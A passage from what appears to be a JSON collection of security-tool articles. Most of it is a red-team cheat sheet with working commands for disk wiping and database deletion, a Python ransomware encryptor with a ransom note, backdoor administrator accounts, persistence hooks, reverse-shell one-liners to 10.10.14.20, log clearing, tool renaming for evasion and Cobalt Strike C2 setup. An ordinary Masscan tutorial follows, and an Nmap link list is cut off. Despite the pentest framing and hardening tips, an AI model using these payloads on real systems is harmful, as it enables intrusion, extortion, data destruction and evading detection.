\\;\n\n# Windows recursive deletion\ndel /s /q /f C:\\data\\*\nrmdir /s /q C:\\data\n```\n\n**Disk wiping:**\n\n```bash\n# Linux disk wiping\ndd if=/dev/zero of=/dev/sda bs=1M\nshred -v -n 5 /dev/sda\n\n# Windows cipher wipe\ncipher /w:C:\\\n```\n\n**Database destruction:**\n\n```sql\n-- SQL database destruction\nDROP DATABASE production;\nDELETE FROM important_table;\nTRUNCATE TABLE critical_data;\n```\n\n#### What to Expect\nData loss, system disruption, and potential business impact.\n\n#### Detection / Hardening\n*   File integrity monitoring\n*   Backup systems\n*   Access controls\n*   Change management\n*   Disaster recovery plans\n\n#### Tools / References\n**rm**, **del**, **dd**, **shred**, **cipher**\n\n#### OPSEC / Notes\nOnly in authorized scenarios. Document impact for reporting. Consider legal implications.\n\n### 11.2 Ransomware Deployment\n\n#### What It Is / Why It Matters\nEncrypting files and demanding payment for decryption, simulating real ransomware attacks.\n\n#### Quick Steps / Commands\n\n**Simple encryption script:**\n\n```python\nimport os\nfrom cryptography.fernet import Fernet\n\n# Generate key\nkey = Fernet.generate_key()\ncipher_suite = Fernet(key)\n\n# Encrypt files\nfor root, dirs, files in os.walk(\"C:\\\\target\"):\n    for file in files:\n        file_path = os.path.join(root, file)\n        with open(file_path, 'rb') as f:\n            encrypted_data = cipher_suite.encrypt(f.read())\n        with open(file_path + '.encrypted', 'wb') as f:\n            f.write(encrypted_data)\n        os.remove(file_path)\n```\n\n**Ransom note creation:**\n\n```python\n# Create ransom note\nnote = \"\"\"\nYour files have been encrypted!\n\nTo decrypt, send 0.1 BTC to: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\n\nContact: decrypt@protonmail.com\n\"\"\"\n\nwith open(\"README_DECRYPT.txt\", \"w\") as f:\n    f.write(note)\n```\n\n#### What to Expect\nEncrypted files, ransom notes, and simulated extortion scenario.\n\n#### Detection / Hardening\n*   File encryption monitoring\n*   Backup systems\n*   Application whitelisting\n*   **EDR** ransomware protection\n*   User training\n\n#### Tools / References\nCustom scripts, cryptography libraries, simulated ransomware\n\n#### OPSEC / Notes\nUse only in controlled environments. Have decryption capability. Clear documentation.\n\n### 11.3 Account Manipulation\n\n#### What It Is / Why It Matters\nModifying user accounts for persistence, privilege escalation, or access maintenance.\n\n#### Quick Steps / Commands\n\n**User account creation:**\n\n```cmd\n# Local user creation\nnet user backdoor Password123! /add\nnet localgroup administrators backdoor /add\n\n# Domain user creation\nnet user /domain backdoor Password123! /add\nnet group \"Domain Admins\" backdoor /add /domain\n```\n\n**Password changes:**\n\n```cmd\n# Change user password\nnet user administrator NewPassword123!\n\n# Domain password change\nnet user /domain administrator NewPassword123!\n```\n\n**Group membership modification:**\n\n```powershell\n# PowerShell AD modifications\nAdd-ADGroupMember -Identity \"Domain Admins\" -Members \"backdoor_user\"\n\n# Local group modifications\nAdd-LocalGroupMember -Group \"Administrators\" -Member \"backdoor_user\"\n```\n\n#### What to Expect\nModified account permissions, new backdoor accounts, and changed authentication.\n\n#### Detection / Hardening\n*   Account monitoring\n*   Privileged access management\n*   Regular user reviews\n*   Change auditing\n*   **MFA** implementation\n\n#### Tools / References\n**net.exe**, **PowerShell**, AD modules\n\n#### OPSEC / Notes\nDocument all changes. Use realistic account names. Clean up after engagement.\n\n### 11.4 Data Extraction\n\n#### What It Is / Why It Matters\nCollecting and preparing sensitive data for exfiltration to demonstrate data breach impact.\n\n#### Quick Steps / Commands\n\n**Sensitive file discovery:**\n\n```powershell\n# Find sensitive files\nGet-ChildItem C:\\ -Include *.pdf,*.doc,*.docx,*.xls,*.xlsx -Recurse -ErrorAction SilentlyContinue\n\n# Search for specific content\nSelect-String -Path \"*.txt\" -Pattern \"password|confidential|secret\"\n\n# Database extraction\nInvoke-SQLCmd -Query \"SELECT * FROM Users\" -ServerInstance \"DBSERVER\"\n```\n\n**Data classification:**\n\n```powershell\n# Identify PII/PCI data\n$patterns = @{\n    \"SSN\" = \"\\d{3}-\\d{2}-\\d{4}\"\n    \"CreditCard\" = \"\\d{4}-\\d{4}-\\d{4}-\\d{4}\"\n    \"Email\" = \"\\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Z|a-z]{2,}\\b\"\n}\n\nGet-ChildItem C:\\data -Recurse | ForEach-Object {\n    $content = Get-Content $_.FullName\n    foreach ($pattern in $patterns.GetEnumerator()) {\n        if ($content -match $pattern.Value) {\n            Write-Host \"Found $($pattern.Key) in $($_.FullName)\"\n        }\n    }\n}\n```\n\n#### What to Expect\nIdentified sensitive data, prepared for exfiltration analysis and reporting.\n\n#### Detection / Hardening\n*   Data classification systems\n*   Access monitoring\n*   **DLP** solutions\n*   File activity auditing\n*   Encryption at rest\n\n#### Tools / References\n**PowerShell**, **grep**, custom scripts, **DLP** tools\n\n#### OPSEC / Notes\nOnly access authorized data. Document findings. Secure extracted data.\n\n### 11.5 Defacement / Persistence\n\n#### What It Is / Why It Matters\nDemonstrating system compromise through visible changes while maintaining access for continued testing.\n\n#### Quick Steps / Commands\n\n**Web defacement:**\n\n```html\n<!-- Simple defacement page -->\n<html>\n<head><title>System Compromised</title></head>\n<body>\n<h1>Security Test Successful</h1>\n<p>This system has been compromised during authorized penetration testing.</p>\n<p>Test ID: PT-2024-001</p>\n<p>Contact: security@company.com</p>\n</body>\n</html>\n```\n\n**Persistence mechanisms:**\n\n```powershell\n# Multiple persistence methods\n# Scheduled task\n$Action = New-ScheduledTaskAction -Execute \"powershell.exe\" -Argument \"-File C:\\beacon.ps1\"\n$Trigger = New-ScheduledTaskTrigger -AtStartup\nRegister-ScheduledTask -TaskName \"SystemUpdate\" -Action $Action -Trigger $Trigger -RunLevel Highest\n\n# Service creation\nNew-Service -Name \"WindowsMonitor\" -BinaryPathName \"C:\\beacon.exe\" -StartupType Automatic\n\n# Registry run key\nNew-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"Update\" -Value \"C:\\beacon.exe\"\n```\n\n#### What to Expect\nVisible compromise indicators and maintained access for continued testing.\n\n#### Detection / Hardening\n*   File integrity monitoring\n*   Web application firewalls\n*   Change detection\n*   **EDR** persistence detection\n*   Regular system reviews\n\n#### Tools / References\nCustom HTML, **PowerShell**, system utilities\n\n#### OPSEC / Notes\nClear communication of test nature. Professional defacement content. Document persistence methods.\n\n## 12. 🔧 Technical Sections\n\n### 12.1 Tools\n\n#### Essential tool categories and examples:\n\n**Reconnaissance:**\n\n```bash\n# Subdomain enumeration\nsubfinder -d target.com\namass enum -d target.com\n\n# Port scanning\nnmap -sS -sV -sC target.com\nmasscan -p1-65535 10.10.10.0/24 --rate=1000\n```\n\n**Vulnerability Assessment:**\n\n```bash\n# Web vulnerability scanning\nnikto -h target.com\nnuclei -u target.com -t vulnerabilities/\n\n# Network vulnerability scanning\nnessus\nopenvas\n```\n\n**Exploitation:**\n\n```bash\n# Metasploit framework\nmsfconsole\nuse exploit/windows/smb/ms17_010_eternalblue\n\n# Standalone exploits\nsearchsploit apache 2.4.49\n```\n\n**Post-Exploitation:**\n\n```bash\n# Privilege escalation\nwinpeas.exe\nlinpeas.sh\n\n# Lateral movement\ncrackmapexec smb 10.10.10.0/24 -u user -p pass\n```\n\n#### What to Expect\nA comprehensive toolset for all engagement phases, regularly updated and tested.\n\n#### Detection / Hardening\n*   Application control\n*   **EDR** tool detection\n*   Network monitoring\n*   Regular patching\n*   Security tool deployment\n\n#### Tools / References\n**Kali Linux**, **Parrot OS**, custom toolkits, commercial tools\n\n#### OPSEC / Notes\nUse custom compiled tools. Rename executables. Understand tool signatures.\n\n### 12.2 Payloads & One-Liners\n\n#### Comprehensive payload reference:\n\n**Reverse Shell Payloads:**\n\n```bash\n# Bash\nbash -i >& /dev/tcp/10.10.14.20/443 0>&1\n\n# Python\npython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.20\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n\n# Perl\nperl -e 'use Socket;$i=\"10.10.14.20\";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'\n\n# Ruby\nruby -rsocket -e 'c=TCPSocket.new(\"10.10.14.20\",\"443\");$stdin.reopen(c);$stdout.reopen(c);$stderr.reopen(c);exec(\"/bin/sh -i\")'\n```\n\n**File Transfer Methods:**\n\n```bash\n# Linux to Windows\nscp file.txt user@windows:/C:/temp/\n\n# Windows to Linux\ncopy file.txt \\\\linux\\share\\\ncertutil -urlcache -split -f http://10.10.14.20/file.txt file.txt\n```\n\n#### What to Expect\nQuick reference for common payloads and transfer methods during engagements.\n\n#### Detection / Hardening\n*   Payload detection\n*   Network monitoring\n*   Application control\n*   **EDR** behavioral analysis\n*   User training\n\n#### Tools / References\n**RevShells.com**, **PayloadsAllTheThings**, **MSFVenom**\n\n#### OPSEC / Notes\nEncode/obfuscate payloads. Use staging. Test against target controls.\n\n### 12.3 OPSEC Notes\n\n#### Operational security considerations:\n\n**Communication Security:**\n\n```bash\n# Encrypted C2 channels\n# Use HTTPS, DNS over TLS, encrypted tunnels\n# Domain fronting when possible\n```\n\n**Tool Obfuscation:**\n\n```bash\n# Rename tools\ncp nmap system_update\ncp mimikatz windows_checkup.exe\n\n# Compile from source\ngcc -o legitimate_tool exploit.c\n```\n\n**Log Management:**\n\n```bash\n# Clear logs\nwevtutil cl security\nwevtutil cl system\n\n# PowerShell history\nRemove-Item (Get-PSReadlineOption).HistorySavePath\n```\n\n**Network OPSEC:**\n\n```bash\n# Use common ports\n# Mimic legitimate traffic\n# Implement jitter and sleep times\n# Use redirectors\n```\n\n#### What to Expect\nReduced detection risk and extended operational capability through proper **OPSEC**.\n\n#### Detection / Hardening\n*   Comprehensive logging\n*   **EDR** integration\n*   Network monitoring\n*   Behavioral analysis\n*   Threat hunting\n\n#### Tools / References\n**OPSEC** frameworks, tradecraft guides, operational security manuals\n\n#### OPSEC / Notes\nAssume all actions are monitored. Plan for detection. Have exit strategies.\n\n### 12.4 MITRE ATT&CK Mapping\n\n#### Framework alignment for reporting:\n\n**Technique Mapping:**\n\n```yaml\nInitial Access:\n  - T1566: Phishing\n  - T1078: Valid Accounts\n  - T1189: Drive-by Compromise\n\nExecution:\n  - T1059: Command and Scripting Interpreter\n  - T1047: WMI\n  - T1569: System Services\n\nPersistence:\n  - T1547: Boot or Logon Autostart Execution\n  - T1053: Scheduled Task/Job\n  - T1543: Create or Modify System Process\n```\n\n**Procedure Examples:**\n\n```bash\n# T1059.003: Windows Command Shell\ncmd.exe /c whoami\n\n# T1059.001: PowerShell\npowershell -c \"Get-Process\"\n\n# T1047: WMI\nwmic process call create \"calc.exe\"\n```\n\n#### What to Expect\nStandardized attack documentation and reporting aligned with industry frameworks.\n\n#### Detection / Hardening\n*   **ATT&CK**-based detection rules\n*   Technique-specific hardening\n*   Control implementation\n*   Security maturity assessment\n\n#### Tools / References\n**MITRE ATT&CK Framework**, **Navigator**, detection engineering guides\n\n#### OPSEC / Notes\nUnderstand technique detection likelihood. Map to client security controls.\n\n### 12.5 C2 Infrastructure Setup\n\n#### Professional C2 infrastructure:\n\n**Redirector Setup:**\n\n```bash\n# socat redirector\nsocat TCP-LISTEN:80,fork TCP:teamserver:80\n\n# Apache mod_rewrite\nRewriteEngine On\nRewriteCond %{HTTP_HOST} ^redirector.com$\nRewriteRule ^/(.*)$ http://teamserver:80/$1 [P]\n\n# DNS redirector\n# Point domains to teamserver IP\n```\n\n**Domain Setup:**\n\n```bash\n# Domain registration\n# Use common TLDs (.com, .net)\n# Set short TTL for quick changes\n# Configure DNS records\n\n# SSL certificates\nletsencrypt certonly --webroot -w /var/www/html -d redirector.com\n```\n\n**Teamserver Configuration:**\n\n```bash\n# Cobalt Strike teamserver\n./teamserver 10.10.14.20 password /path/to/profile.profile\n\n# Malleable C2 profile\nhttp-get {\n    set uri \"/api/collect\";\n    client {\n        metadata {\n            base64;\n            header \"Cookie\";\n        }\n    }\n}\n```\n\n#### What to Expect\nResilient, scalable C2 infrastructure with redundancy and operational security.\n\n#### Detection / Hardening\n*   Infrastructure fingerprinting\n*   Certificate analysis\n*   Traffic pattern recognition\n*   Domain reputation monitoring\n*   Take-down coordination\n\n#### Tools / References\n**Cobalt Strike**, **Metasploit**, **Apache**, **socat**, **Let's Encrypt**\n\n#### OPSEC / Notes\nRegular infrastructure rotation. Monitoring for compromise. Geographic distribution.\n\n## 13. 🎯 Bonus\n\n### 13.1 Realistic Scenarios\n\n#### Common engagement scenarios:\n\n**External Network Assessment:**\n\n```markdown\n1. Reconnaissance → Subdomain enumeration, port scanning\n2. Vulnerability identification → Web apps, services\n3. Exploitation → Public exploits, custom payloads\n4. Post-exploitation → Privilege escalation, lateral movement\n5. Data access → Sensitive data identification\n6. Reporting → Findings, recommendations\n```\n\n**Internal Network Assessment:**\n\n```markdown\n1. Initial access → Phishing, physical access\n2. Local enumeration → Users, groups, network\n3. Privilege escalation → Misconfigurations, vulnerabilities\n4. Domain compromise → Credential dumping, lateral movement\n5. Persistence → Multiple mechanisms\n6. Objectives → Data access, control demonstration\n```\n\n#### What to Expect\nReal-world attack simulation following common adversary tactics.\n\n#### Detection / Hardening\n*   Defense-in-depth\n*   Incident response testing\n*   Control validation\n*   Security awareness\n*   Continuous monitoring\n\n#### Tools / References\nEngagement playbooks, scenario libraries, **TTP** databases\n\n#### OPSEC / Notes\nFollow engagement rules. Document actions. Maintain professionalism.\n\n### 13.2 Checklists\n\n#### Engagement preparation and execution:\n\n**Pre-engagement Checklist:**\n\n```markdown\n- [x] Scope definition and authorization\n- [x] Rules of engagement documented\n- [x] Communication channels established\n- [x] Infrastructure setup and testing\n- [x] Tools prepared and tested\n- [x] Client contacts identified\n- [x] Emergency procedures documented\n```\n\n**Post-engagement Checklist:**\n\n```markdown\n- [x] All persistence removed\n- [x] Client systems returned to normal\n- [x] Data securely handled/returned\n- [x] Findings documented and verified\n- [x] Report drafted and reviewed\n- [x] Client debrief scheduled\n- [x] Lessons learned documented\n```\n\n#### What to Expect\nOrganized engagement execution and professional client delivery.\n\n#### Detection / Hardening\n*   Process documentation\n*   Quality assurance\n*   Client satisfaction\n*   Continuous improvement\n*   Knowledge management\n\n#### Tools / References\nEngagement templates, project management tools, documentation systems\n\n#### OPSEC / Notes\nMaintain checklists securely. Update regularly. Share lessons learned.\n\n### 13.3 Reporting Templates\n\n#### Professional reporting structure:\n\n**Executive Summary:**\n\n```markdown\n# Executive Summary\n\n## Overall Risk Rating: High/Medium/Low\n\n## Key Findings\n- Critical vulnerability in web application\n- Domain admin compromise possible\n- Sensitive data exposed\n\n## Business Impact\n- Potential financial loss: $X\n- Compliance violations: Yes/No\n- Reputation damage: High/Medium/Low\n\n## Immediate Actions\n1. Patch critical vulnerability\n2. Reset compromised credentials\n3. Implement monitoring controls\n```\n\n**Technical Details:**\n\n```markdown\n# Technical Findings\n\n## Vulnerability Details\n- CVE-XXXX-XXXX: Remote Code Execution\n- CVSS Score: 9.8\n- Attack Path: External → Web Server → Domain Admin\n\n## Evidence\n- Screenshots of compromised systems\n- Log excerpts showing attack progression\n- Data accessed during testing\n\n## Recommendations\n- Technical controls\n- Process improvements\n- Training recommendations\n```\n\n#### What to Expect\nProfessional, actionable reports that help clients improve security posture.\n\n#### Detection / Hardening\n*   Clear communication\n*   Actionable recommendations\n*   Risk-based prioritization\n*   Business context\n*   Follow-up planning\n\n#### Tools / References\nReporting templates, risk frameworks, presentation tools\n\n#### OPSEC / Notes\nSecure report storage. Client-specific sensitivity. Professional delivery."
      }
    ]
  },
  {
    "name": "Masscan",
    "description": "The fastest Internet port scanner, asynchronous.",
    "category": "Network Scanning & Analysis",
    "tags": [
      "fast port scanning",
      "large networks"
    ],
    "color": "#56e54b",
    "articles": [
      {
        "title": "Masscan — Complete Detailed Guide",
        "content": "# Masscan — Complete Detailed Guide\n\n> **Structured, numbered sections.** Each section contains:\n>\n> * **What it is / Why it matters** — short conceptual explanation.\n> * **Step-by-step commands** — runnable commands with safe defaults.\n> * **What to expect** — typical output or behavior.\n> * **Troubleshooting & tips** — common problems and fixes.\n> * **Safety / ethics note** — when applicable.\n\n---\n\n## 1. What is Masscan?\n\n### What it is / Why it matters\n\nMasscan (by Robert Graham) is a high‑performance port scanner optimized for Internet‑scale discovery. It implements its own asynchronous TCP/IP stack and packet transmitter to achieve very high packet-per-second rates. Use cases include fast reconnaissance, large‑scale inventory, and discovery before targeted, in‑depth scanning with tools such as Nmap.\n\n### Step-by-step commands — safe defaults\n\n```bash\n# Check masscan exists and version (non-invasive)\nmasscan --version\n\n# Conservative local discovery (recommended first run)\nsudo masscan 192.168.1.0/24 -p80,443,22 --rate 100\n```\n\n### What to expect\n\nYou will see console output listing each IP with open ports, e.g. `Discovered open port 80/tcp on 192.168.1.5`. At conservative rates this completes quickly without disrupting typical corporate LAN traffic.\n\n### Troubleshooting & tips\n\n* If `masscan` is not found, recheck installation path or `make install` logs.\n* If results seem incomplete, lower `--rate` (fewer dropped packets) and increase `--retries`.\n\n### Safety / ethics note\n\nMasscan can produce large amounts of traffic. Only scan systems you own or have explicit written permission to test.\n\n---\n\n## 2. Installation & Setup\n\n### What it is / Why it matters\n\nInstallation ensures you have the latest stable binary and required permissions to send raw packets (often requiring root or specific capabilities).\n\n### Step-by-step commands — Linux (safe defaults)\n\n```bash\n# Quick install (may be older package)\nsudo apt update && sudo apt install -y masscan\n\n# Build latest from source (recommended for cutting-edge fixes)\ngit clone https://github.com/robertdavidgraham/masscan.git\ncd masscan\nmake\nsudo make install\n\n# Allow non-root execution with capability (optional)\nsudo setcap cap_net_raw+ep $(which masscan)\n```\n\n### Step-by-step commands — macOS\n\n```bash\n# Homebrew (quick)\nbrew install masscan\n\n# Or build from source (same as Linux)\n# git clone ... ; make ; sudo make install\n```\n\n### Step-by-step commands — Windows\n\n```text\n# Download prebuilt binary from GitHub Releases:\n# https://github.com/robertdavidgraham/masscan/releases\n# If compiling, install Npcap (WinPcap compatibility) and use Visual Studio.\n```\n\n### What to expect\n\nA `masscan` binary in your PATH that can be run with `sudo` (or with `setcap` configured). On Windows, the binary will be ready for CLI usage.\n\n### Troubleshooting & tips\n\n* `make` errors: ensure `gcc`, `make`, and `libpcap-dev` are installed.\n* `setcap` may not be available in some containers or minimal distros; fallback to running with `sudo`.\n\n### Safety / ethics note\n\nDo not install or use scanning tools against corporate or third‑party networks without authorization.\n\n---\n\n## 3. Core Syntax & Concepts\n\n### What it is / Why it matters\n\nUnderstanding the command structure, target formats, and port expressions is essential to avoid accidental scans of unintended IP ranges.\n\n### Step-by-step commands — basics\n\n```bash\n# Core form\nsudo masscan [targets] -p[ports] --rate [pps]\n\n# Single host example\nsudo masscan 192.168.1.100 -p80,443 --rate 100\n\n# CIDR example\nsudo masscan 192.168.1.0/24 -p22 --rate 100\n\n# Multiple ranges\nsudo masscan 192.168.1.0/24,10.0.0.0/8 -p80 --rate 500\n```\n\n### Target formats\n\n* Single IP: `192.168.1.5`\n* Range: `192.168.1.1-192.168.1.254`\n* CIDR: `10.0.0.0/8`\n* Multiple: `192.168.1.0/24,203.0.113.0/24`\n\n### Port formats\n\n* Single: `-p80`\n* List: `-p80,443,22`\n* Range: `-p1-1000`\n* All: `-p1-65535` (use with extreme caution)\n\n### What to expect\n\nClear, concise scanning commands. Always confirm the exact target set before launching large scans.\n\n### Troubleshooting & tips\n\n* Mistyped CIDR or `0.0.0.0/0` will cause Internet‑wide scanning—double‑check.\n* Use `--exclude` to protect private or sensitive ranges.\n\n### Safety / ethics note\n\nDouble‑check `targets`, `--exclude`, and `--rate` to avoid accidental abuse.\n\n---\n\n## 4. Protocols (TCP, UDP, SCTP)\n\n### What it is / Why it matters\n\nDifferent services run on different transports. Masscan defaults to TCP but can scan UDP and other protocols with proper syntax.\n\n### Step-by-step commands — examples\n\n```bash\n# TCP (default)\nsudo masscan 192.168.1.0/24 -p80 --rate 100\n\n# UDP (note: slower, may require retries)\nsudo masscan 192.168.1.0/24 -pU:53,161 --rate 200\n\n# Combined TCP and UDP\nsudo masscan 192.168.1.0/24 -p80,443,U:53 --rate 200\n\n# SCTP\nsudo masscan 192.168.1.0/24 -pS:36412 --rate 100\n```\n\n### What to expect\n\n* TCP responses (SYN/ACK) are straightforward and fastest.\n* UDP detection is inherently less reliable and often requires Nmap follow‑up.\n\n### Troubleshooting & tips\n\n* If UDP returns few hits, lower `--rate` and add `--retries`.\n* Validate with `nmap -sU` for UDP services of interest.\n\n### Safety / ethics note\n\nUDP scans can generate ICMP traffic spikes and alarms; always coordinate large UDP scans.\n\n---\n\n## 5. Rate Control & Performance\n\n### What it is / Why it matters\n\nRate (`--rate`) controls packets per second. Balancing scan speed vs. network impact and accuracy is critical.\n\n### Step-by-step commands — examples\n\n```bash\n# Conservative\nsudo masscan 192.168.1.0/24 -p80 --rate 100\n\n# Moderate\nsudo masscan 10.0.0.0/8 -p80,443 --rate 1000\n\n# Aggressive (lab only)\nsudo masscan 0.0.0.0/0 -p80,443 --rate 100000 --exclude 10.0.0.0/8,192.168.0.0/16\n```\n\n### What to expect\n\nLower rates provide more reliable detection with less packet loss. Higher rates increase speed but risk missing responses and triggering network defenses.\n\n### Troubleshooting & tips\n\n* Monitor `--stats` output to see live packet stats. Reduce `--rate` if packet drops are high.\n* If scanning multiple subnets, distribute load across NICs or scan iteratively.\n\n### Safety / ethics note\n\nHigh rates can resemble a denial‑of‑service; never use aggressive rates on shared or production networks.\n\n---\n\n## 6. Output Formats & Handling\n\n### What it is / Why it matters\n\nMasscan supports JSON, XML, grepable outputs — essential for automation and pipelines.\n\n### Step-by-step commands — examples\n\n```bash\n# JSON\nsudo masscan 192.168.1.0/24 -p80 -oJ scan.json --rate 100\n\n# XML\nsudo masscan 192.168.1.0/24 -p80 -oX scan.xml --rate 100\n\n# Grepable (gnmap-like)\nsudo masscan 192.168.1.0/24 -p80 -oG scan.gnmap --rate 100\n\n# List\nsudo masscan 192.168.1.0/24 -p80 -oL scan.list --rate 100\n\n# Append output\nsudo masscan ... --append-output\n\n# Only show open ports\nsudo masscan ... --open-only\n```\n\n### What to expect\n\nMachine‑readable output suitable for parsing. JSON and XML are best for robust automation.\n\n### Troubleshooting & tips\n\n* When scripting, prefer JSON + `jq` to avoid brittle `grep`/`awk` parsing.\n* Use timestamped filenames when running recurring scans.\n\n### Safety / ethics note\n\nStore scan outputs securely, as they leak network topology and service exposure.\n\n---\n\n## 7. Advanced Options (Source, Interface, Packet Fields)\n\n### What it is / Why it matters\n\nAdvanced options let you bind interface, set source IP/ports, tweak TTLs, or randomize order to influence detection behavior.\n\n### Step-by-step commands — examples\n\n```bash\n# Bind to a specific interface\nsudo masscan 192.168.1.0/24 -p80 --interface eth1 --rate 500\n\n# Set source IP (must be routable from the host)\nsudo masscan 192.168.1.0/24 -p80 --source-ip 192.168.1.50 --rate 200\n\n# Source port range\nsudo masscan 192.168.1.0/24 -p80 --source-port 40000-50000 --rate 200\n\n# Set TTL\nsudo masscan 192.168.1.0/24 -p80 --ttl 64 --rate 200\n\n# Randomize host order\nsudo masscan 192.168.1.0/24 -p80 --randomize-hosts --rate 200\n```\n\n### What to expect\n\nDifferent packet appearance which may change firewall/IDS reaction. Useful for testing filtering behavior or making probe traffic look regular.\n\n### Troubleshooting & tips\n\n* `--source-ip` requires proper routing—wrong settings can cause packets to be dropped before returning.\n* Spoofing source IPs typically requires additional routing configuration or is ineffective.\n\n### Safety / ethics note\n\nAvoid source IP spoofing or deceptive techniques on networks you don't own. These techniques can be illegal.\n\n---\n\n## 8. Stealth Techniques & When to Use Them\n\n### What it is / Why it matters\n\nStealth techniques aim to reduce detectability (slow rate, fragmentation, randomization). They increase time and complexity and may still be flagged by modern security tools.\n\n### Step-by-step commands — examples\n\n```bash\n# Very slow, randomized\nsudo masscan 192.168.1.0/24 -p80 --rate 10 --randomize-hosts\n\n# Fragment packets (may evade simple IDS but can cause problems)\nsudo masscan 192.168.1.0/24 -p80 --fragment --rate 50\n\n# Use decoy source IPs (requires explicit authorization)\nsudo masscan 192.168.1.0/24 -p80 --source-ip 192.168.1.10,192.168.1.20 --rate 50\n```\n\n### What to expect\n\nFewer detections but significantly slower completion. Fragmentation sometimes prevents response parsing and yields false positives.\n\n### Troubleshooting & tips\n\n* Modern IDS/IPS are resilient to basic evasion; prefer coordinated testing with blue teams.\n* Fragmentation can increase network load due to reassembly or dropped fragments.\n\n### Safety / ethics note\n\nThese techniques are sensitive; only use under an explicit, written test plan and authorization.\n\n---\n\n## 9. Configuration Files\n\n### What it is / Why it matters\n\nMasscan config files allow repeatable scans and easier parameter management.\n\n### Step-by-step commands — examples\n\n```bash\n# Create base config (human editable)\nmasscan --echo > masscan.conf\n\n# Example masscan.conf content (edit with care):\n# rate = 100\n# output-format = json\n# output-filename = scan.json\n# ports = 80,443,22\n# range = 192.168.1.0/24\n# exclude = 192.168.1.1\n\n# Use config\nsudo masscan -c masscan.conf\n\n# Override a value\nsudo masscan -c masscan.conf --rate 200\n```\n\n### What to expect\n\nSimplified commands and consistent defaults across runs.\n\n### Troubleshooting & tips\n\n* CLI options override config file values — be mindful when changing parameters.\n* Keep separate configs per environment (lab, prod-scoped, research).\n\n### Safety / ethics note\n\nProtect config files from unauthorized access; they may contain sensitive ranges and operational parameters.\n\n---\n\n## 10. Practical Examples & Use Cases\n\n### What it is / Why it matters\n\nConcrete use cases and command examples to apply Masscan in realistic scenarios.\n\n### Step-by-step commands — examples\n\n```bash\n# Quick internal discovery (recommended default)\nsudo masscan 192.168.1.0/24 -p80,443,22,21 --rate 200 -oJ web-scan-$(date +%F_%H%M).json\n\n# Find web servers in a large private network (break into parts)\nfor net in 10.0.{0..3}.0/24; do\n  sudo masscan $net -p80,443,8080,8443 --rate 2000 -oL web-$net.list\ndone\n\n# Internet-scale (EXPLICIT AUTHORIZATION REQUIRED)\nsudo masscan 0.0.0.0/0 -p80,443 --rate 100000 --exclude 10.0.0.0/8,192.168.0.0/16,172.16.0.0/12\n```\n\n### What to expect\n\nInternal scans: fast results and safe operation when rates are conservative. Internet scans: enormous traffic and swift blocking by providers if unauthorized.\n\n### Troubleshooting & tips\n\n* Break large jobs into smaller prefixes to control load and monitoring.\n* Use `--exclude` to avoid accidental hits on management or production segments.\n\n### Safety / ethics note\n\nNever scan the public Internet at high rates without explicit written authorization and coordination with your ISP and other stakeholders.\n\n---\n\n## 11. Integration with Nmap & Pipelines\n\n### What it is / Why it matters\n\nUse Masscan for fast discovery and Nmap for deep fingerprinting and vulnerability checks — an efficient two‑stage approach.\n\n### Step-by-step commands — example pipeline\n\n```bash\n# Stage 1: discovery\nsudo masscan 192.168.1.0/24 -p1-65535 --rate 1000 -oX masscan.xml\n\n# Stage 2: extract host:port\ngrep 'portid' masscan.xml | grep 'state=\"open\"' | awk -F'\"' '{print $4\":\"$8}' | sort -u > open_ports.txt\n\n# Stage 3: more precise nmap scans\nwhile IFS= read -r line; do\n  host=$(echo \"$line\" | cut -d: -f1)\n  port=$(echo \"$line\" | cut -d: -f2)\n  nmap -sV -p$port $host\ndone < open_ports.txt\n```\n\n### What to expect\n\nMasscan narrows the target set dramatically; Nmap provides service/version info and scripts for deeper analysis.\n\n### Troubleshooting & tips\n\n* Prefer JSON + `jq` parsing for reliability instead of fragile `grep`/`awk` patterns.\n* For many hosts/ports, batch Nmap jobs to avoid overloading scanners or targets.\n\n### Safety / ethics note\n\nCoordinate follow‑on active service probes with asset owners to avoid impact.\n\n---\n\n## 12. Performance Tuning & System Optimization\n\n### What it is / Why it matters\n\nTuning OS limits and network buffers reduces kernel bottlenecks for high throughput scanning.\n\n### Step-by-step commands — examples\n\n```bash\n# Temporarily raise file descriptors\nulimit\n```\n"
      }
    ]
  },
  {
    "name": "Nmap",
    "description": "Network discovery and security auditing tool.",
    "category": "Network Scanning & Analysis",
    "tags": [
      "port scanning",
      "service detection",
      "OS detection"
    ],
    "articles": [
      {
        "title": "Nmap for Pentester",
        "content": "# Nmap for Pentester\n\nThis cheatsheet was created to assist Red Teamers and Penetration Testers in hunting down vulnerabilities using \"Nmap.\" It is designed such that beginners can understand the fundamentals and professionals can brush up their skills with the advanced options. There are multiple ways to perform all the mentioned tasks, so we've performed them all and compiled this list with our experience. Please share it with your connections and send your queries and feedback directly to [Aarti Singh](https://www.linkedin.com/in/aarti--singh/).\n\n# Follow us on [![alt text](http://i.imgur.com/tXSoThF.png)](http://www.twitter.com/hackinarticles)\n\n![cheatsheet](https://github.com/Ignitetechnologies/Mindmap/blob/main/Nmap/nmap%20UHD.png?raw=true)\n\n1. [Host Discovery](https://www.hackingarticles.in/nmap-for-pentester-host-discovery/)\n2. [Output Format Scan](https://www.hackingarticles.in/nmap-for-pentester-output-format-scan/)\n3. [Understanding Nmap Packet Trace](https://www.hackingarticles.in/understanding-nmap-packet-trace/)\n4. [Nmap Scan with Timing Parameters](https://www.hackingarticles.in/nmap-scan-with-timing-parameters/)\n5. [Nmap Scans using Hex Value of Flags](https://www.hackingarticles.in/nmap-scans-using-hex-value-flags/)\n6. [Forensic Investigation of Nmap Scan using Wireshark](https://www.hackingarticles.in/forensic-investigation-of-nmap-scan-using-wireshark/)\n7. [Nmap for Pentester: Timing Scan](https://www.hackingarticles.in/nmap-for-pentester-timing-scan/)\n8. [Nmap for Pentester: Ping Scan](https://www.hackingarticles.in/nmap-for-pentester-ping-scan/)\n9. [Nmap for Pentester: 